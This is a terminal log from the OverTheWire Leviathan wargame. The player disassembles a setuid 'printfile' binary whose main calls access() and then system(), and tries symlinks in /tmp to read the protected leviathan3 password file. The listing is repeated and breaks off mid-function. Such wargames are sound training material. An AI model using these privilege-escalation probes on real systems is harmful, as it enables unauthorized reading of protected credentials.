 80486bb:	ff 74 24 2c          	pushl  0x2c(%esp)
 80486bf:	ff 74 24 2c          	pushl  0x2c(%esp)
 80486c3:	55                   	push   %ebp
 80486c4:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
 80486cb:	83 c7 01             	add    $0x1,%edi
 80486ce:	83 c4 10             	add    $0x10,%esp
 80486d1:	39 f7                	cmp    %esi,%edi
 80486d3:	75 e3                	jne    80486b8 <__libc_csu_init+0x38>
 80486d5:	83 c4 0c             	add    $0xc,%esp
 80486d8:	5b                   	pop    %ebx
 80486d9:	5e                   	pop    %esi
 80486da:	5f                   	pop    %edi
 80486db:	5d                   	pop    %ebp
 80486dc:	c3                   	ret
 80486dd:	8d 76 00             	lea    0x0(%esi),%esi

080486e0 <__libc_csu_fini>:
 80486e0:	f3 c3                	repz ret

Disassembly of section .fini:

080486e4 <_fini>:
 80486e4:	53                   	push   %ebx
 80486e5:	83 ec 08             	sub    $0x8,%esp
 80486e8:	e8 d3 fd ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 80486ed:	81 c3 13 19 00 00    	add    $0x1913,%ebx
 80486f3:	83 c4 08             	add    $0x8,%esp
 80486f6:	5b                   	pop    %ebx
 80486f7:	c3                   	ret
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/xx
leviathan2@leviathan:~$ ./printfile /tmp/xx
/bin/cat: /tmp/xx: Is a directory
leviathan2@leviathan:~$ ll /tmp/xx
total 20
drwxrwxr-x   2 leviathan2 leviathan2  4096 Jan  8 10:39 ./
drwxrwx-wt 271 root       root       16384 Jan  8 10:38 ../
lrwxrwxrwx   1 leviathan2 leviathan2    30 Jan  8 10:39 leviathan3 -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ ./printfile /tmp/xx/leviathan3
You cant have that file...
leviathan2@leviathan:~$ objdump -d -Mintel printfile

printfile:     file format elf32-i386


Disassembly of section .init:

080483b4 <_init>:
 80483b4:	53                   	push   ebx
 80483b5:	83 ec 08             	sub    esp,0x8
 80483b8:	e8 03 01 00 00       	call   80484c0 <__x86.get_pc_thunk.bx>
 80483bd:	81 c3 43 1c 00 00    	add    ebx,0x1c43
 80483c3:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80483c9:	85 c0                	test   eax,eax
 80483cb:	74 05                	je     80483d2 <_init+0x1e>
 80483cd:	e8 ae 00 00 00       	call   8048480 <access@plt+0x10>
 80483d2:	83 c4 08             	add    esp,0x8
 80483d5:	5b                   	pop    ebx
 80483d6:	c3                   	ret

Disassembly of section .plt:

080483e0 <printf@plt-0x10>:
 80483e0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80483e6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80483ec:	00 00                	add    BYTE PTR [eax],al
	...

080483f0 <printf@plt>:
 80483f0:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 80483f6:	68 00 00 00 00       	push   0x0
 80483fb:	e9 e0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048400 <__stack_chk_fail@plt>:
 8048400:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048406:	68 08 00 00 00       	push   0x8
 804840b:	e9 d0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048410 <geteuid@plt>:
 8048410:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048416:	68 10 00 00 00       	push   0x10
 804841b:	e9 c0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048420 <puts@plt>:
 8048420:	ff 25 18 a0 04 08    	jmp    DWORD PTR ds:0x804a018
 8048426:	68 18 00 00 00       	push   0x18
 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048430 <system@plt>:
 8048430:	ff 25 1c a0 04 08    	jmp    DWORD PTR ds:0x804a01c
 8048436:	68 20 00 00 00       	push   0x20
 804843b:	e9 a0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048440 <setreuid@plt>:
 8048440:	ff 25 20 a0 04 08    	jmp    DWORD PTR ds:0x804a020
 8048446:	68 28 00 00 00       	push   0x28
 804844b:	e9 90 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048450 <__libc_start_main@plt>:
 8048450:	ff 25 24 a0 04 08    	jmp    DWORD PTR ds:0x804a024
 8048456:	68 30 00 00 00       	push   0x30
 804845b:	e9 80 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048460 <snprintf@plt>:
 8048460:	ff 25 28 a0 04 08    	jmp    DWORD PTR ds:0x804a028
 8048466:	68 38 00 00 00       	push   0x38
 804846b:	e9 70 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048470 <access@plt>:
 8048470:	ff 25 2c a0 04 08    	jmp    DWORD PTR ds:0x804a02c
 8048476:	68 40 00 00 00       	push   0x40
 804847b:	e9 60 ff ff ff       	jmp    80483e0 <_init+0x2c>

Disassembly of section .plt.got:

08048480 <.plt.got>:
 8048480:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 8048486:	66 90                	xchg   ax,ax

Disassembly of section .text:

08048490 <_start>:
 8048490:	31 ed                	xor    ebp,ebp
 8048492:	5e                   	pop    esi
 8048493:	89 e1                	mov    ecx,esp
 8048495:	83 e4 f0             	and    esp,0xfffffff0
 8048498:	50                   	push   eax
 8048499:	54                   	push   esp
 804849a:	52                   	push   edx
 804849b:	68 e0 86 04 08       	push   0x80486e0
 80484a0:	68 80 86 04 08       	push   0x8048680
 80484a5:	51                   	push   ecx
 80484a6:	56                   	push   esi
 80484a7:	68 8d 85 04 08       	push   0x804858d
 80484ac:	e8 9f ff ff ff       	call   8048450 <__libc_start_main@plt>
 80484b1:	f4                   	hlt
 80484b2:	66 90                	xchg   ax,ax
 80484b4:	66 90                	xchg   ax,ax
 80484b6:	66 90                	xchg   ax,ax
 80484b8:	66 90                	xchg   ax,ax
 80484ba:	66 90                	xchg   ax,ax
 80484bc:	66 90                	xchg   ax,ax
 80484be:	66 90                	xchg   ax,ax

080484c0 <__x86.get_pc_thunk.bx>:
 80484c0:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 80484c3:	c3                   	ret
 80484c4:	66 90                	xchg   ax,ax
 80484c6:	66 90                	xchg   ax,ax
 80484c8:	66 90                	xchg   ax,ax
 80484ca:	66 90                	xchg   ax,ax
 80484cc:	66 90                	xchg   ax,ax
 80484ce:	66 90                	xchg   ax,ax

080484d0 <deregister_tm_clones>:
 80484d0:	b8 3b a0 04 08       	mov    eax,0x804a03b
 80484d5:	2d 38 a0 04 08       	sub    eax,0x804a038
 80484da:	83 f8 06             	cmp    eax,0x6
 80484dd:	77 01                	ja     80484e0 <deregister_tm_clones+0x10>
 80484df:	c3                   	ret
 80484e0:	b8 00 00 00 00       	mov    eax,0x0
 80484e5:	85 c0                	test   eax,eax
 80484e7:	74 f6                	je     80484df <deregister_tm_clones+0xf>
 80484e9:	55                   	push   ebp
 80484ea:	89 e5                	mov    ebp,esp
 80484ec:	83 ec 18             	sub    esp,0x18
 80484ef:	c7 04 24 38 a0 04 08 	mov    DWORD PTR [esp],0x804a038
 80484f6:	ff d0                	call   eax
 80484f8:	c9                   	leave
 80484f9:	c3                   	ret
 80484fa:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]

08048500 <register_tm_clones>:
 8048500:	b8 38 a0 04 08       	mov    eax,0x804a038
 8048505:	2d 38 a0 04 08       	sub    eax,0x804a038
 804850a:	c1 f8 02             	sar    eax,0x2
 804850d:	89 c2                	mov    edx,eax
 804850f:	c1 ea 1f             	shr    edx,0x1f
 8048512:	01 d0                	add    eax,edx
 8048514:	d1 f8                	sar    eax,1
 8048516:	75 01                	jne    8048519 <register_tm_clones+0x19>
 8048518:	c3                   	ret
 8048519:	ba 00 00 00 00       	mov    edx,0x0
 804851e:	85 d2                	test   edx,edx
 8048520:	74 f6                	je     8048518 <register_tm_clones+0x18>
 8048522:	55                   	push   ebp
 8048523:	89 e5                	mov    ebp,esp
 8048525:	83 ec 18             	sub    esp,0x18
 8048528:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804852c:	c7 04 24 38 a0 04 08 	mov    DWORD PTR [esp],0x804a038
 8048533:	ff d2                	call   edx
 8048535:	c9                   	leave
 8048536:	c3                   	ret
 8048537:	89 f6                	mov    esi,esi
 8048539:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

08048540 <__do_global_dtors_aux>:
 8048540:	80 3d 38 a0 04 08 00 	cmp    BYTE PTR ds:0x804a038,0x0
 8048547:	75 13                	jne    804855c <__do_global_dtors_aux+0x1c>
 8048549:	55                   	push   ebp
 804854a:	89 e5                	mov    ebp,esp
 804854c:	83 ec 08             	sub    esp,0x8
 804854f:	e8 7c ff ff ff       	call   80484d0 <deregister_tm_clones>
 8048554:	c6 05 38 a0 04 08 01 	mov    BYTE PTR ds:0x804a038,0x1
 804855b:	c9                   	leave
 804855c:	f3 c3                	repz ret
 804855e:	66 90                	xchg   ax,ax

08048560 <frame_dummy>:
 8048560:	a1 10 9f 04 08       	mov    eax,ds:0x8049f10
 8048565:	85 c0                	test   eax,eax
 8048567:	74 1f                	je     8048588 <frame_dummy+0x28>
 8048569:	b8 00 00 00 00       	mov    eax,0x0
 804856e:	85 c0                	test   eax,eax
 8048570:	74 16                	je     8048588 <frame_dummy+0x28>
 8048572:	55                   	push   ebp
 8048573:	89 e5                	mov    ebp,esp
 8048575:	83 ec 18             	sub    esp,0x18
 8048578:	c7 04 24 10 9f 04 08 	mov    DWORD PTR [esp],0x8049f10
 804857f:	ff d0                	call   eax
 8048581:	c9                   	leave
 8048582:	e9 79 ff ff ff       	jmp    8048500 <register_tm_clones>
 8048587:	90                   	nop
 8048588:	e9 73 ff ff ff       	jmp    8048500 <register_tm_clones>

0804858d <main>:
 804858d:	55                   	push   ebp
 804858e:	89 e5                	mov    ebp,esp
 8048590:	53                   	push   ebx
 8048591:	83 e4 f0             	and    esp,0xfffffff0
 8048594:	81 ec 30 02 00 00    	sub    esp,0x230
 804859a:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804859d:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 80485a1:	65 a1 14 00 00 00    	mov    eax,gs:0x14
 80485a7:	89 84 24 2c 02 00 00 	mov    DWORD PTR [esp+0x22c],eax
 80485ae:	31 c0                	xor    eax,eax
 80485b0:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
 80485b4:	7f 2c                	jg     80485e2 <main+0x55>
 80485b6:	c7 04 24 00 87 04 08 	mov    DWORD PTR [esp],0x8048700
 80485bd:	e8 5e fe ff ff       	call   8048420 <puts@plt>
 80485c2:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80485c6:	8b 00                	mov    eax,DWORD PTR [eax]
 80485c8:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80485cc:	c7 04 24 15 87 04 08 	mov    DWORD PTR [esp],0x8048715
 80485d3:	e8 18 fe ff ff       	call   80483f0 <printf@plt>
 80485d8:	b8 ff ff ff ff       	mov    eax,0xffffffff
 80485dd:	e9 82 00 00 00       	jmp    8048664 <main+0xd7>
 80485e2:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80485e6:	83 c0 04             	add    eax,0x4
 80485e9:	8b 00                	mov    eax,DWORD PTR [eax]
 80485eb:	c7 44 24 04 04 00 00 	mov    DWORD PTR [esp+0x4],0x4
 80485f2:	00
 80485f3:	89 04 24             	mov    DWORD PTR [esp],eax
 80485f6:	e8 75 fe ff ff       	call   8048470 <access@plt>
 80485fb:	85 c0                	test   eax,eax
 80485fd:	74 13                	je     8048612 <main+0x85>
 80485ff:	c7 04 24 29 87 04 08 	mov    DWORD PTR [esp],0x8048729
 8048606:	e8 15 fe ff ff       	call   8048420 <puts@plt>
 804860b:	b8 01 00 00 00       	mov    eax,0x1
 8048610:	eb 52                	jmp    8048664 <main+0xd7>
 8048612:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048616:	83 c0 04             	add    eax,0x4
 8048619:	8b 00                	mov    eax,DWORD PTR [eax]
 804861b:	89 44 24 0c          	mov    DWORD PTR [esp+0xc],eax
 804861f:	c7 44 24 08 44 87 04 	mov    DWORD PTR [esp+0x8],0x8048744
 8048626:	08
 8048627:	c7 44 24 04 ff 01 00 	mov    DWORD PTR [esp+0x4],0x1ff
 804862e:	00
 804862f:	8d 44 24 2c          	lea    eax,[esp+0x2c]
 8048633:	89 04 24             	mov    DWORD PTR [esp],eax
 8048636:	e8 25 fe ff ff       	call   8048460 <snprintf@plt>
 804863b:	e8 d0 fd ff ff       	call   8048410 <geteuid@plt>
 8048640:	89 c3                	mov    ebx,eax
 8048642:	e8 c9 fd ff ff       	call   8048410 <geteuid@plt>
 8048647:	89 5c 24 04          	mov    DWORD PTR [esp+0x4],ebx
 804864b:	89 04 24             	mov    DWORD PTR [esp],eax
 804864e:	e8 ed fd ff ff       	call   8048440 <setreuid@plt>
 8048653:	8d 44 24 2c          	lea    eax,[esp+0x2c]
 8048657:	89 04 24             	mov    DWORD PTR [esp],eax
 804865a:	e8 d1 fd ff ff       	call   8048430 <system@plt>
 804865f:	b8 00 00 00 00       	mov    eax,0x0
 8048664:	8b 94 24 2c 02 00 00 	mov    edx,DWORD PTR [esp+0x22c]
 804866b:	65 33 15 14 00 00 00 	xor    edx,DWORD PTR gs:0x14
 8048672:	74 05                	je     8048679 <main+0xec>
 8048674:	e8 87 fd ff ff       	call   8048400 <__stack_chk_fail@plt>
 8048679:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 804867c:	c9                   	leave
 804867d:	c3                   	ret
 804867e:	66 90                	xchg   ax,ax

08048680 <__libc_csu_init>:
 8048680:	55                   	push   ebp
 8048681:	57                   	push   edi
 8048682:	56                   	push   esi
 8048683:	53                   	push   ebx
 8048684:	e8 37 fe ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 8048689:	81 c3 77 19 00 00    	add    ebx,0x1977
 804868f:	83 ec 0c             	sub    esp,0xc
 8048692:	8b 6c 24 20          	mov    ebp,DWORD PTR [esp+0x20]
 8048696:	8d b3 0c ff ff ff    	lea    esi,[ebx-0xf4]
 804869c:	e8 13 fd ff ff       	call   80483b4 <_init>
 80486a1:	8d 83 08 ff ff ff    	lea    eax,[ebx-0xf8]
 80486a7:	29 c6                	sub    esi,eax
 80486a9:	c1 fe 02             	sar    esi,0x2
 80486ac:	85 f6                	test   esi,esi
 80486ae:	74 25                	je     80486d5 <__libc_csu_init+0x55>
 80486b0:	31 ff                	xor    edi,edi
 80486b2:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]
 80486b8:	83 ec 04             	sub    esp,0x4
 80486bb:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80486bf:	ff 74 24 2c          	push   DWORD PTR [esp+0x2c]
 80486c3:	55                   	push   ebp
 80486c4:	ff 94 bb 08 ff ff ff 	call   DWORD PTR [ebx+edi*4-0xf8]
 80486cb:	83 c7 01             	add    edi,0x1
 80486ce:	83 c4 10             	add    esp,0x10
 80486d1:	39 f7                	cmp    edi,esi
 80486d3:	75 e3                	jne    80486b8 <__libc_csu_init+0x38>
 80486d5:	83 c4 0c             	add    esp,0xc
 80486d8:	5b                   	pop    ebx
 80486d9:	5e                   	pop    esi
 80486da:	5f                   	pop    edi
 80486db:	5d                   	pop    ebp
 80486dc:	c3                   	ret
 80486dd:	8d 76 00             	lea    esi,[esi+0x0]

080486e0 <__libc_csu_fini>:
 80486e0:	f3 c3                	repz ret

Disassembly of section .fini:

080486e4 <_fini>:
 80486e4:	53                   	push   ebx
 80486e5:	83 ec 08             	sub    esp,0x8
 80486e8:	e8 d3 fd ff ff       	call   80484c0 <__x86.get_pc_thunk.bx>
 80486ed:	81 c3 13 19 00 00    	add    ebx,0x1913
 80486f3:	83 c4 08             	add    esp,0x8
 80486f6:	5b                   	pop    ebx
 80486f7:	c3                   	ret
leviathan2@leviathan:~$ packet_write_wait: Connection to 176.9.9.172 port 2223: Broken pipe
➜  ~ ssh leviathan2@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan2@leviathan:~$ ll
total 28
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan3 leviathan2 7596 Nov 13 16:03 printfile*
leviathan2@leviathan:~$ objdump -d printfile -Mintel

printfile:     file format elf32-i386


Disassembly of section .init:

080483b4 <_init>:
 80483b4:	53                   	push   ebx
 80483b5:	83 ec 08             	sub    esp,0x8
 80483b8:	e8 03 01 00 00       	call   80484c0 <__x86.get_pc_thunk.bx>
 80483bd:	81 c3 43 1c 00 00    	add    ebx,0x1c43
 80483c3:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80483c9:	85 c0                	test   eax,eax
 80483cb:	74 05                	je     80483d2 <_init+0x1e>
 80483cd:	e8 ae 00 00 00       	call   8048480 <access@plt+0x10>
 80483d2:	83 c4 08             	add    esp,0x8
 80483d5:	5b                   	pop    ebx
 80483d6:	c3                   	ret

Disassembly of section .plt:

080483e0 <printf@plt-0x10>:
 80483e0:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 80483e6:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 80483ec:	00 00                	add    BYTE PTR [eax],al
	...

080483f0 <printf@plt>:
 80483f0:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 80483f6:	68 00 00 00 00       	push   0x0
 80483fb:	e9 e0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048400 <__stack_chk_fail@plt>:
 8048400:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048406:	68 08 00 00 00       	push   0x8
 804840b:	e9 d0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048410 <geteuid@plt>:
 8048410:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048416:	68 10 00 00 00       	push   0x10
 804841b:	e9 c0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048420 <puts@plt>:
 8048420:	ff 25 18 a0 04 08    	jmp    DWORD PTR ds:0x804a018
 8048426:	68 18 00 00 00       	push   0x18
 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048430 <system@plt>:
 8048430:	ff 25 1c a0 04 08    	jmp    DWORD PTR ds:0x804a01c
 8048436:	68 20 00 00 00       	push   0x20
 804843b:	e9 a0 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048440 <setreuid@plt>:
 8048440:	ff 25 20 a0 04 08    	jmp    DWORD PTR ds:0x804a020
 8048446:	68 28 00 00 00       	push   0x28
 804844b:	e9 90 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048450 <__libc_start_main@plt>:
 8048450:	ff 25 24 a0 04 08    	jmp    DWORD PTR ds:0x804a024
 8048456:	68 30 00 00 00       	push   0x30
 804845b:	e9 80 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048460 <snprintf@plt>:
 8048460:	ff 25 28 a0 04 08    	jmp    DWORD PTR ds:0x804a028
 8048466:	68 38 00 00 00       	push   0x38
 804846b:	e9 70 ff ff ff       	jmp    80483e0 <_init+0x2c>

08048470 <access@plt>:
 8048470:	ff 25 2c a0 04 08    	jmp    DWORD PTR ds:0x804a02c
 8048476:	68 40 00 00 00       	push   0x40
 804847b:	e9 60 ff ff ff       	jmp    80483e0 <_init+0x2c>

Disassembly of section .plt.got:

08048480 <.plt.got>:
 8048480:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 8048486:	66 90                	xchg   ax,ax

Disassembly of section .text:

08048490 <_start>:
 8048490:	31 ed                	xor    ebp,ebp
 8048492:	5e                   	pop    esi
 8048493:	89 e1                	mov    ecx,esp
 8048495:	83 e4 f0             	and    esp,0xfffffff0
 8048498:	50                   	push   eax
 8048499:	54                   	push   esp
 804849a:	52                   	push   edx
 804849b:	68 e0 86 04 08       	push   0x80486e0
 80484a0:	68 80 86 04 08       	push   0x8048680
 80484a5:	51                   	push   ecx
 80484a6:	56                   	push   esi
 80484a7:	68 8d 85 04 08       	push   0x804858d
 80484ac:	e8 9f ff ff ff       	call   8048450 <__libc_start_main@plt>
 80484b1:	f4                   	hlt
 80484b2:	66 90                	xchg   ax,ax
 80484b4:	66 90                	xchg   ax,ax
 80484b6:	66 90                	xchg   ax,ax
 80484b8:	66 90                	xchg   ax,ax
 80484ba:	66 90                	xchg   ax,ax
 80484bc:	66 90                	xchg   ax,ax
 80484be:	66 90                	xchg   ax,ax

080484c0 <__x86.get_pc_thunk.bx>:
 80484c0:	8b 1c 24             	mov    ebx,DWORD PTR [esp]
 80484c3:	c3                   	ret
 80484c4:	66 90                	xchg   ax,ax
 80484c6:	66 90                	xchg   ax,ax
 80484c8:	66 90                	xchg   ax,ax
 80484ca:	66 90                	xchg   ax,ax
 80484cc:	66 90                	xchg   ax,ax
 80484ce:	66 90                	xchg   ax,ax

080484d0 <deregister_tm_clones>:
 80484d0:	b8 3b a0 04 08       	mov    eax,0x804a03b
 80484d5:	2d 38 a0 04 08       	sub    eax,0x804a038
 80484da:	83 f8 06             	cmp    eax,0x6
 80484dd:	77 01                	ja     80484e0 <deregister_tm_clones+0x10>
 80484df:	c3                   	ret
 80484e0:	b8 00 00 00 00       	mov    eax,0x0
 80484e5:	85 c0                	test   eax,eax
 80484e7:	74 f6                	je     80484df <deregister_tm_clones+0xf>
 80484e9:	55                   	push   ebp
 80484ea:	89 e5                	mov    ebp,esp
 80484ec:	83 ec 18             	sub    esp,0x18
 80484ef:	c7 04 24 38 a0 04 08 	mov    DWORD PTR [esp],0x804a038
 80484f6:	ff d0                	call   eax
 80484f8:	c9                   	leave
 80484f9:	c3                   	ret
 80484fa:	8d b6 00 00 00 00    	lea    esi,[esi+0x0]

08048500 <register_tm_clones>:
 8048500:	b8 38 a0 04 08       	mov    eax,0x804a038
 8048505:	2d 38 a0 04 08       	sub    eax,0x804a038
 804850a:	c1 f8 02             	sar    eax,0x2
 804850d:	89 c2                	mov    edx,eax
 804850f:	c1 ea 1f             	shr    edx,0x1f
 8048512:	01 d0                	add    eax,edx
 8048514:	d1 f8                	sar    eax,1
 8048516:	75 01                	jne    8048519 <register_tm_clones+0x19>
 8048518:	c3                   	ret
 8048519:	ba 00 00 00 00       	mov    edx,0x0
 804851e:	85 d2                	test   edx,edx
 8048520:	74 f6                	je     8048518 <register_tm_clones+0x18>
 8048522:	55                   	push   ebp
 8048523:	89 e5                	mov    ebp,esp
 8048525:	83 ec 18             	sub    esp,0x18
 8048528:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 804852c:	c7 04 24 38 a0 04 08 	mov    DWORD PTR [esp],0x804a038
 8048533:	ff d2                	call   edx
 8048535:	c9                   	leave
 8048536:	c3                   	ret
 8048537:	89 f6                	mov    esi,esi
 8048539:	8d bc 27 00 00 00 00 	lea    edi,[edi+eiz*1+0x0]

08048540 <__do_global_dtors_aux>:
 8048540:	80 3d 38 a0 04 08 00 	cmp    BYTE PTR ds:0x804a038,0x0
 8048547:	75 13                	jne    804855c <__do_global_dtors_aux+0x1c>
 8048549:	55                   	push   ebp
 804854a:	89 e5                	mov    ebp,esp
 804854c:	83 ec 08             	sub    esp,0x8
 804854f:	e8 7c ff ff ff       	call   80484d0 <deregister_tm_clones>
 8048554:	c6 05 38 a0 04 08 01 	mov    BYTE PTR ds:0x804a038,0x1
 804855b:	c9                   	leave
 804855c:	f3 c3                	repz ret
 804855e:	66 90                	xchg   ax,ax

08048560 <frame_dummy>:
 8048560:	a1 10 9f 04 08       	mov    eax,ds:0x8049f10
 8048565:	85 c0                	test   eax,eax
 8048567:	74 1f                	je     8048588 <frame_dummy+0x28>
 8048569:	b8 00 00 00 00       	mov    eax,0x0
 804856e:	85 c0                	test   eax,eax
 8048570:	74 16                	je     8048588 <frame_dummy+0x28>
 8048572:	55                   	push   ebp
 8048573:	89 e5                	mov    ebp,esp
 8048575:	83 ec 18             	sub    esp,0x18
 8048578:	c7 04 24 10 9f 04 08 	mov    DWORD PTR [esp],0x8049f10
 804857f:	ff d0                	call   eax
 8048581:	c9                   	leave
 8048582:	e9 79 ff ff ff       	jmp    8048500 <register_tm_clones>
 8048587:	90                   	nop
 8048588:	e9 73 ff ff ff       	jmp    8048500 <register_tm_clones>

0804858d <main>:
 804858d:	55                   	push   ebp
 804858e:	89 e5                	mov    ebp,esp
 8048590:	53                   	push   ebx
 8048591:	83 e4 f0             	and    esp,0xfffffff0
 8048594:	81 ec 30 02 00 00    	sub    esp,0x230
 804859a:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804859d:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 80485a1:	65 a1 14 00 00 00    	mov    eax,gs:0x14
 80485a7:	89 84 24 2c 02 00 00 	mov    DWORD PTR [esp+0x22c],eax
 80485ae:	31 c0                	xor    eax,eax
 80485b0:	83 7d 08 01          	cmp    DWORD PTR [ebp+0x8],0x1
 80485b4:	7f 2c                	jg     80485e2 <main+0x55>
 80485b6:	c7 04 24 00 87 04 08 	mov    DWORD PTR [esp],0x8048700
 80485bd:	e8 5e fe ff ff       	call   8048420 <puts@plt>
 80485c2:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80485c6:	8b 00                	mov    eax,DWORD PTR [eax]
 80485c8:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80485cc:	c7 04 24 15 87 04 08 	mov    DWORD PTR [esp],0x8048715
 80485d3:	e8 18 fe ff ff       	call   80483f0 <printf@plt>
 80485d8:	b8 ff ff ff ff       	mov    eax,0xffffffff
 80485dd:	e9 82 00 00 00       	jmp    8048664 <main+0xd7>
 80485e2:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80485e6:	83 c0 04             	add    eax,0x4
 80485e9:	8b 00                	mov    eax,DWORD PTR [eax]
 80485eb:	c7 44 24 04 04 00 00 	mov    DWORD PTR [esp+0x4],0x4
 80485f2:	00
 80485f3:	89 04 24             	mov    DWORD PTR [esp],eax
 80485f6:	e8 75 fe ff ff       	call   8048470 <access@plt>
 80485fb:	85 c0                	test   eax,eax
 80485fd:	74 13                	je     8048612 <main+0x85>
 80485ff:	c7 04 24 29 87 04 08 	mov    DWORD PTR [esp],0x8048729
 8048606:	e8 15 fe ff ff       	call   8048420 <puts@plt>
 804860b:	b8 01 00 00 00       	mov    eax,0x1
 8048610:	eb 52                	jmp    8048664 <main+0xd7>
 8048612:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048616:	83 c0 04             	add    eax,0x4
